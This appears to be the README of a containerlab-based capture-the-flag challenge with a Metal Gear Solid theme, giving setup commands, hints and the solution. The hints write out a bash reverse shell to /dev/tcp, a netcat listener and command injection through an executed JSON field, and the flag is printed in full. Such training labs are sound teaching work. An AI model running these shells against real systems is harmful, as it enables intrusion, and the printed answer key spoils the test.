# Metal Gear Solid CTF Challenge

## Difficulty rating 
![stars](https://starrating-beta.vercel.app/3/) *100 points*
\
Requires solid HTTP fundamentals, bash/netcat familiarity, header manipulation, log parsing, and basic reverse shell crafting. Also, the hints are quite vague

### **Description**
An infiltration-themed web and network CTF challenge where participants navigate a network to uncover a patriots passkey. Exploit HTTP, the shell and misconfigured requests to retrieve hints and find the flag.
Requires understanding of HTTP headers, web requests, log analysis, base64 encoding, reverse shells, and  TCP networking + tools like curl, nmap, and netcat.
\
\
**Catagory:**
Web Exploitation / Network Services

### **How to run**

#### Requirements
- [docker](https://www.docker.com/)  > 28.1.1
- [containerlabs](https://containerlab.dev/) > 0.68.0

In the projects root directory, run:
```
sudo containerlab deploy --topo topology.yml
```
to destroy:
```
sudo containerlab destroy --topo topology.yml
```

<br>

> [!NOTE]
> It may take a while to load and you may recieve 503 errors for the first 20 seconds depending on your internet and pc

### Hints
<details>
<summary>Hint 1: first curls</summary>
<br>
Curl each webserver individually. Correct the typo in S3cr3t/paslyword to secret/password. Find a way to show the response headers in curl when you curl with `Accept: application/secret`
</details>

<details>
<summary>Hint 2: after you've done the web3 challenge</summary>

Combine everything together, /top/secret/password?condition=trust with  `Accept: application/secret`. This is valid on any webserver
</details>

<details>
<summary>Hint 3: once ssh'd in</summary>
<br>
find / -name "*json" 2> /dev/null. The update property has echo in its string, suggesting its executing it. Use a reverse shell and net cat to establish connectiion
</details>

<details>
<summary>Hint 3: continued</summary>
<br>
bash -i >& /dev/tcp/web3/1337 0>&1 then after saving the file: nc -lvnp 1337 
</details>

<details>
<summary>Flag:</summary>
<br>
flag{PATRIOT_PASS} 
</details>

![image](https://github.com/user-attachments/assets/3d1260d3-cf7c-4ffc-a3d2-5f73fcc32ac4)
